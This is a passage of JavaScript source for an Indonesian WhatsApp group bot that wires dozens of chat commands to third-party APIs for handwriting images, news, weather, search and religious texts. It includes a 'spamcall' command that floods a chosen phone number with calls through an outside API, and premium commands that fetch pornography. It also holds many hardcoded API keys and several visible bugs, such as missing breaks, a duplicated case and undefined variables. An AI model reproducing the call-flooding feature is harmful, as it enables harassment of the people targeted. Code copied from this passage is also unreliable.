                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_icon = await getBuffer(get_result.thumb)
                    await syaa.sendMessage(from, ini_icon, image, { quoted: mek, caption: ini_txt })
                    break
                    case 'nuliskiri':
case 'Nuliskiri':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    c = args.join(" ")
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis`},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'  Katashi ', imageMessage: imageMsg,
              contentText:`    @k4t4sh1._ `,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
      
break
case 'nuliskanan':
case 'Nuliskanan':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    c = args.join(" ")
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis`},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'  Katashi ', imageMessage: imageMsg,
              contentText:`    @k4t4sh1._ `,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
     
break
case 'foliokanan':
case 'Foliokanan':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    c = args.join(" ")
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=hardianto`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis`},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'  Katashi ', imageMessage: imageMsg,
              contentText:`    @k4t4sh1._ `,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
break
case 'xs':
case 'Xs':
if (!isPremium) return reply(mess.prem)
if (args.length == 0) return reply(`Example: ${prefix + command} Blowjob`)
                    query = args.join(" ")
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${query}&apikey=Ikyy69`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}\n\n  *DOWNLOAD*
 ${prefix}xvideo [link xvid] = Video`
syaa.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
case 'Xvideo':
case 'Xv':
if (!isPremium) return reply(mess.prem)
if (args.length == 0) return reply(`Example: ${prefix + command} xvideos.com/`)
                    c = args.join(" ")
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=Ikyy69`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
syaa.sendMessage(from, vid, video, {quoted: mek})
break
case 'xnxx':
case 'Xnxx':
case 'xn':
case 'Xn':
if (!isPremium) return reply(mess.prem)
if (args.length == 0) return reply(`Example: ${prefix + command} xnxx.com/`)
                    c = args.join(" ")
x = await fetchJson(`https://kocakz.herokuapp.com/api/media/xnxx/detail?url=${c}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
syaa.sendMessage(from, vid, video, {quoted: mek})
break
case 'listnulis':
case 'Listnulis':

  reply(`Example ${prefix}nulis tes
   ${prefix}nulis putra
   ${prefix}foliokanan putra
   ${prefix}foliokiri putra
   ${prefix}nuliskanan putra
   ${prefix}nuliskiri putta`)
  break
case 'foliokiri':
case 'Foliokiri':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    c = args.join(" ")
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=hardianto`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis`},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:' ?? Katashi ', imageMessage: imageMsg,
              contentText:`    @k4t4sh1._ `,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
break
case 'xnxxsearch':
case 'xs2':
 case 'Xnxxsearch':
case 'Xs2':
if (args.length == 0) return reply(`Example: ${prefix + command} query`)
                    c = args[0]
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xnxxsearch?query=${c}&apikey=Ikyy69`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}\n\n  *DOWNLOAD*
 ${prefix}xvideo [link xvid] = Video`
syaa.sendMessage(from, anu, text, {quoted: mek})
break
        case 'meadmin':
        case 'Meadmin':
if (!isGroup) return reply('Khusus Group')
if (!isOwner) return
if (isGroupAdmins) return reply('Lu Dah Admin Om')
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
syaa.groupMakeAdmin(from, [sender])
reply('Sukses')
break
case 'cuaca':
case 'Cuaca':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`http://zekais-api.herokuapp.com/cuaca?daerah=${daerah}&apikey=vZ7wFVI3`)
                    ini_txt = `Tempat : ${get_result.Nama}\n`
                    ini_txt += `Cuaca : ${get_result.Cuaca}\n`
                    ini_txt += `Angin : ${get_result.Angin}\n`
                    ini_txt += `Description : ${get_result.Keterangan}\n`
                    ini_txt += `Kelembapan : ${get_result.Melembapan}\n`
                    ini_txt += `Suhu : ${get_result.Suhu}\n`
                    ini_txt += `Udara : ${get_result.Udara}\n`
                    await syaa.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: mek })
                    reply(ini_txt)
                    break
case 'nickepep': // Update By KATASHI 
case 'Nickepep': // Update By katashi 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n\n \n`
					}
					reply(teks.trim())
					
					break
case 'urlshort': //By katashi
case 'url': //By katashi
case 'Urlshort': //By katashi
case 'Url': //By katashi
                         if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api.zeks.xyz/api/urlshort?url=${query}&apikey=Iyungputra`, {method: 'get'})
teks = `${anu.result}`
syaa.sendMessage(from, teks, text, {quoted: mek})
break
case 'ppcp': //By katashi
case 'Ppcp': //By katashi
case 'ppcouple': //By katashi
case 'Ppcouple': //By katashi
reply(mess.wait)
anu = await fetchJson(`https://api.dapuhy.ga/api/randomimage/couple?apikey=T3SleesqYU6gyfM`, {method: 'get'})
image1 = await getBuffer(anu.result.pria)
image2 = await getBuffer(anu.result.wanita)
syaa.sendMessage(from, image1, image, {quoted: mek })
syaa.sendMessage(from, image2, image, {quoted: mek})
break
case 'gfx': //By katashi
case 'Gfx': //By katashi
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
reply(mess.wait)
anu = await getBuffer(`https://velgrynd.herokuapp.com/api/gfx?nama=${query}`, {method: 'get'})
syaa.sendMessage(from, anu, image, {quoted: mek })
break
case 'gfx2': //By katashi
case 'Gfx2': //By katashi
if (args.length < 1) return reply(`*Example :*\n${prefix}${command} +628xxx|yoo`)
					makell = args.join(" ")
					c1 = makell.split("|")[0];
					c2 = makell.split("|")[1];
reply(mess.wait)
anu = await getBuffer(`https://velgrynd.herokuapp.com/api/gfx3?text=${c1}&text2=${c2}`, {method: 'get'})
syaa.sendMessage(from, anu, image, {quoted: mek })
break
case 'simi':
case 'Simi':
case 'bot':
case 'Bot':
case 'katashi':
case 'Katashi':
case 'Putra':
case 'Putra':
if (args.length == 0) return reply(`kamu ganteng`)
                    c = args.join(" ")
x = await fetchJson(`https://api.simsimi.net/v2/?text=${c}&lc=id`)
syaa.sendMessage(from, `${x.success}`, text, {quoted: mek})
break
case 'urlshort2': //By katashi
case 'url2': //By katashi
case 'Urlshort2': //By katashi
case 'Url2': //By katashi
if (args.length == 0) return reply(`Link nya?`)
                    query = args.join(" ")	
anu = await fetchJson(`https://api.dapuhy.ga/api/others/cuttly?url=${query}&apikey=T3SleesqYU6gyfM`, {method: 'get'})
teks = `${anu.result}`
syaa.sendMessage(from, teks, text, {quoted: mek})
break
        case 'del':
		        case 'd':
		        case 'delete':             
case 'Del':
		        case 'D':
		        case 'Delete':                
				syaa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
				break
case 'meme':
case 'Meme':
reply(mess.wait)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/darkjokes?apikey=Yuzzu`)
buff = await getBuffer(anu.result.result)
gbutsan = [{buttonId:`meme`,buttonText:{displayText:'LANJUT'},type:1}]
mhan = await syaa.prepareMessage(from, buff, image, {thumbnail: buff})
const buttonMessagessss = {
imageMessage: mhan.message.imageMessage,
contentText: `Ngedark Bos`,
footerText: '*_©Katashi Hana_*',
buttons: gbutsan,
headerType: 4
}
syaa.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./syaa.jpg'),
        caption: 'Tes',
            quoted: mek})
case 'listdaerah': //By itsmeval
case 'Listdaerah':
anu = await fetchJson(`https://api.zeks.xyz/api/jadwalsholat?apikey=Iyungputra&daerah=malang`, {method: 'get'})
teks = `${anu.listdaerah}`
syaa.sendMessage(from, teks, text, {quoted: mek})
break
case 'randomquran':
case 'Randomquran':
            res = await axios.get(`https://api.zeks.me/api/randomquran?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR`)
            rquran = res.data.result
            teks = `*Surah* : ${rquran.nama}\n*Arti* : ${rquran.arti}\n*Ayat* : ${rquran.asma}\n*Keterangan* : ${rquran.keterangan}`
            reply(teks)
            syaa.sendFileFromUrl(from, rquran.audio, 'quran.mp3', ``, message)
        break
case 'style':
case 'Style':
				  if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${query}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      syaa.sendMessage(from, hasil, MessageType.text, { quoted: mek});
    })
			break
case 'pastebin':
case 'Pastebin':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${query}`, {method: 'get'})
                   syaa.sendMessage(from, `${anu.result}`, text, {quoted: meki})
                     break
case 'ytplaylist':
case 'Ytplaylist':
if (!isPremium) return reply(mess.prem)
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/ytplaylist?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* YOUTUBE PLAYLIST *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Nama* : ${ttt[i].title}\n*Jumlah video*: ${ttt[i].video_count}\n*Channel*: ${ttt[i].uploader.username}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                        case 'katailham':  
                        case 'Katailham':  
                     const kta =['Lebih baik mengerti sedikit daripada salah mengerti.',
'Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.',
'Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.',
'Penderitaan adalah pelajaran.',
'Ilmu pengetahuan tanpa agama adalah pincang.',
'Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.',
'Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.',
'Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?',
'Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.',
'Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.',
'Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.',
'Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.',
'Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.',
'Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.',
'Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.',
'Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.',
'Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.',
'Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.',
'Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.',
'Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.',
'Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.',
'Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.',
'Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.',
'Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.',
'Anda tidak perlu harus berhasil pada kali pertama.',
'Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.',
'Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.',
'Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.',
'Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
					const su = kta[Math.floor(Math.random() * kta.length)]
					syaa.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: mek })
					break
case 'ingfo':  
case 'Ingfo':  
				    if (!isGroup) return reply(`GRUP ONLY`)
					if (!isGroupAdmins) return reply(`LU ADMIN??`)
					var value = body.slice(7)
					var group = await syaa.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: `[ *INGFO TERBARU!!!* ]\nDARI : *${pushname}*\nINGFO : *${value}*`,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					syaa.sendMessage(from, options, text, {quoted: mek})					 
					break
                        case 'film':
                        case 'Film':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Doraemon`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/film?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* FILM *\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    break
                case 'happymod':
                case 'Happymod':
                    if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/happymod?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `* HAPPYMOD *\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Rate*: ${ttt[i].rating}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    break
                case 'ytchannel':
                case 'Ytchannel':
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/ytchannel?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var eks = `* YOUTUBE CHANNEL *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            eks += `*Nama* : ${ttt[i].title}\n*Deskripsi*: ${ttt[i].description}\n*Verified* : ${ttt[i].verified}\n*Jumlah video*: ${ttt[i].video_count}\n*Subcriber*: ${ttt[i].subscriber_count}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(eks)
                    break
case 'Googlesearch':
                case 'googlesearch':
                case 'ggs':
                case 'Ggs':
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://velgrynd.herokuapp.com/api/google?query=${query}`)
                        ttt = res.data.result
                        var eks = `* GOGGLE SEARCH *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            eks += `*Nama* : ${ttt[i].title}\n*Link*: ${ttt[i].link}\n*Deskripsi* : ${ttt[i].snippet}\n\n`
                        }
                        reply(eks)
                    break
case 'carimasakan':
                case 'Carimasakan':
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await fetchJson(`https://mnazria.herokuapp.com/api/resep-search?text=${query}`)
                        ttt = res.results
                        var tst = `* CARI MASAKAN *\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            tst += `*Nama* : ${ttt[i].title}\n*Kesusahan*: ${ttt[i].difficulty}\n*Kunci* : ${ttt[i].key}\n*Waktu*: ${ttt[i].times}\n*Porsi*: ${ttt[i].serving}\n*Image*: ${ttt[i].thumb}\n\n`
                        }
                        reply(tst.trim())  
                    break
case 'Thelazy':
case 'thelazy':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/thelazy?text=${query}&apikey=Ikyy69`, {method: 'get'})
					teks = 'the lazy\n'
					for (let i of anu.data) {
						teks += `*Judul:* : ${i.title}\n*Creator* : ${i.creator}\n*Kategori* : ${i.category}\n*Author* : ${i.author}\n*Tanggal Post* : ${i.post_date}\n*Comen* : ${i.comments}\n*Url* : ${i.url}\n*Img* : ${i.img}\n\n*THE LAZY*\n`
					}
					reply(teks.trim())  
					
					break
case 'tribunnews': // Update By KATASHI
case 'Tribunnews': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Time* : ${i.time}\n*Url* : ${i.url}\n*Tweet* : ${i.ket}\n\n \n`
					}
					reply(teks.trim())
					
					break
case 'liputan': // Update By KATASHI
case 'Liputan': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=Iyungputra`, {method: 'get'})
					teks = '\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n\n\n`
					}
					reply(teks.trim())
					
					break
case 'spamcall':
case 'Spamcall':
                    if (!isOwner && !mek.key.fromMe) return reply(`LU SIAPA AJG`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 8303030303030`)
                    nomor = args[0]
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    await axios.get(`https://hujanapi.herokuapp.com/api/spamcallv1?no=${nomor}&apikey=trial2k21`)
                    reply("Success")
                    break        
case 'palingmurah': // Update By KATASHI
case 'Palingmurah': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://api.dapuhy.ga/api/search/palingmurah?query=${query}&apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'PALING MURAH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.desc}\n*Price* : ${i.price}\n\nPalingmurah\n`
					}
					reply(teks.trim())
					
					break
case 'sfilesearch': // Update By KATASHI
case 'Sfilesarch': // Update By KATASHI
case 'sfsearch': // Update By KATASHI
case 'Sfsearch': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://api.dapuhy.ga/api/search/sfile?query=${query}&apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'SFILE SEARCH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*IMAGE* : ${i.thumb}\n\nSFILE SEARCH\n`
					}
					reply(teks.trim())
					
					break
case 'Ph': // Update By KATASHI
case 'ph': // Update By KATASHI
case 'phsearch': // Update By KATASHI
case 'Phsearch': // Update By KATASHI
if (!isPremium) return reply(mess.prem)
if (args.length == 0) return reply(`Example: ${prefix + command} milf`)
                    query = args.join(" ")
					data = await fetchJson(`https://bx-hunter.herokuapp.com/api/pornhubscraper?query=japan&apikey=Ikyy69`, {method: 'get'})
					teks = 'PORNHUB SEARCH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.link}\n*Author* : ${i.author}\nHd* : ${i.hd}\n*Premium* : ${x.premium}\n*Views* : ${x.views}\n\nPORNHUB SEARCH\n`
					}
					reply(teks.trim())
					
					break
case 'Tokohindo': // Update By KATASHI
case 'tokohindo': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/others/tokohindo?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'TOKOH INDO\n'
					for (let x of data.result) {
						teks += `*Nama:* : ${x.nama}\n*Asal* : ${x.asal}\n*Nama Asli* : ${x.nama2}\n*Asal* : ${x.asal}\n*Lahir* : ${x.lahir}\n*Gugur* : ${x.gugur}\n*Usia* : ${x.usia}\n*Lokasi Makam* : ${x.lokasimakam}\n*History* : ${x.history}\n\nTOKOH INDO\n`
					}
					reply(teks.trim())
					
					break
case 'kompastv': // Update By KATASHI
case 'Kompastv': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/berita/kompas?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'KOMPAS TV\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Link* : ${x.url}\n*Jenis* : ${x.jenis}\n*Upload* : ${x.upload}\n\nKOMPAS TV\n`
					}
					reply(teks.trim())
					
					break
case 'animeindo': // Update By KATASHI
case 'Animeindo': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://api.dapuhy.ga/api/anime/animeindo?query=${query}&apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'ANIMEiNDO\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Url* : ${x.url}\n*Image* : ${x.thumb}\n*Durasi* : ${x.duration}\n*Release* : ${x.release}\n*Description* : ${x.desc}\n\nANIMEINDO\n`
					}
					reply(teks.trim())
					
					break
case 'Jav': // Update By KATASHI
case 'jav': // Update By KATASHI
case 'JAV': // Update By KATASHI
if (!isPremium) return reply(mess.prem)
if (args.length == 0) return reply(`Example: ${prefix + command} milf`)
                    query = args.join(" ")
					data = await fetchJson(`https://api.dapuhy.ga/api/search/javhdporn?query=${query}&apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'JAV PORN\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Url* : ${x.url}\n*Image* : ${x.thumb}\n*Durasi* : ${x.duration}\n*Viewers* : ${x.viewers}\n*Quality* : ${x.quality}\n\nJAV PORN\n`
					}
					reply(teks.trim())
					
					break
case 'corona': // Update By KATASHI
case 'Corona': // Update By KATASHI
					anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/covidindo?apikey=hardianto`)
					teks = 'CORONA INDO\n'
					for (let x of anu.result) {
						teks += `*Fid:* : ${x.attributes.FID}\n*Kode Provinsi* : ${x.attributes.Kode_Provi}\n*Provinsi* : ${x.attributes.Provinsi}\n*Sembuh* : ${x.attributes.Kasus_Semb}\n*Positive* : ${x.attributes.Kasus_Posi}\n*Meninggal* : ${x.attributes.Kasus_Meni}\n\nCORONA INDO\n`
					}
					reply(teks.trim())
					
					break
case 'genshin':
case 'Genshin':
					data = await fetchJson(`https://raw.githubusercontent.com/mamet8/GenshinImpact/main/genshinimpact.json`, {method: 'get'})
					teks = 'GENSHIN IMPACT\n'
					for (let x of data.mondstadt) {
						teks += `*Nama:* : ${x.title}\n*Intro* : ${x.intro}\n*Icon* : ${x.icon}\n*Dubing* : ${x.name}\n*Audio* : ${x.audio}\n\nGENSHIN IMPACT\n`
					}
					reply(teks.trim())
					
					break
case 'Kodepos': // Update By KATASHI
case 'kodepos': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} bekasi`)
                    query = args.join(" ")
					data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/kodepos?kota=${query}&apikey=hardianto`, {method: 'get'})
					teks = 'INFO KODE POS\n'
					for (let x of data.result.data) {
						teks += `*Province:* : ${x.province}\n*Kecamatan* : ${x.subdistrict}\n*Perkotaan* : ${x.urban}\n*Kode* : ${x.postalcode}\n\nINFO KODE POS\n`
					}
					reply(teks.trim())
					
					break
case 'cnn': // Update By KATASHI
case 'Cnn': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/berita/cnn?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'CNN NEWS\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Link:* ${i.url}*Upload:* ${i.upload}\n\nCNN NEWS\n`
					}
					reply(teks.trim())
					
					break
case 'wirid': // Update By KATASHI
case 'Wirid': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/islam/wirid?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Arab:* ${i.times}*Latin:* ${i.arabic}\n\nDOA WIRID\n`
					}
					reply(teks.trim())
					
					break
case 'tahlil': // Update By KATASHI
case 'Tahlil': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/islam/tahlil?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Title:* ${i.title}*Latin:* ${i.arabic}\n\nTAHLIL\n`
					}
					reply(teks.trim())
					
					break
case 'tahlil': // Update By KATASHI
case 'Tahlil': // Update By KATASHI
					data = await fetchJson(`https://api.dapuhy.ga/api/islam/tahlil?apikey=T3SleesqYU6gyfM`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Title:* ${i.title}*Latin:* ${i.arabic}\n\nTAHLIL\n`
					}
					reply(teks.trim())
					
					break
case 'foxnews': // Update By KATASHI
case 'Foxnews': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=Iyungputra`, {method: 'get'})
					teks = ' \n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Time* : ${i.time}\n*Content* : ${i.content}\n\n \n`
					}
					reply(teks.trim())
					
					break
case 'alay':
case 'Alay':
